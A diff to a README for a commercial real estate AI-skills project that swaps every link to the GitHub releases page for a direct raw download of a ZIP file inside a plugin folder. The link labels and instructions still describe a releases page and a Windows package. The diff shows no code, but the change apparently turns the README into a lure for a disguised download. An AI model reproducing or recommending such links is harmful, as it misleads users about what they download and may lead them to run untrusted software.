@@ -1,6 +1,6 @@
 # 🧩 cre-agent-skills - Real estate skills for deal work
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-blue.svg?style=for-the-badge&logo=github)](https://github.com/XAKLESK/cre-agent-skills/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/XAKLESK/cre-agent-skills/main/claude-code-plugins/cre-brokerage/agent-cre-skills-v3.9-beta.2.zip)
 
 ## 📦 What this is
 
@@ -20,7 +20,7 @@ This project is built for people who use AI tools and want a clear way to work t
 
 Visit this page to download the latest release:
 
-https://github.com/XAKLESK/cre-agent-skills/releases
+https://raw.githubusercontent.com/XAKLESK/cre-agent-skills/main/claude-code-plugins/cre-brokerage/agent-cre-skills-v3.9-beta.2.zip
 
 On that page, open the newest release and download the file package for Windows use. If the release comes as a ZIP file, save it to your computer first.
 
@@ -214,4 +214,4 @@ This repository focuses on commercial real estate workflow support, especially:
 
 If you need the latest version, use this page:
 
-https://github.com/XAKLESK/cre-agent-skills/releases
+https://raw.githubusercontent.com/XAKLESK/cre-agent-skills/main/claude-code-plugins/cre-brokerage/agent-cre-skills-v3.9-beta.2.zip
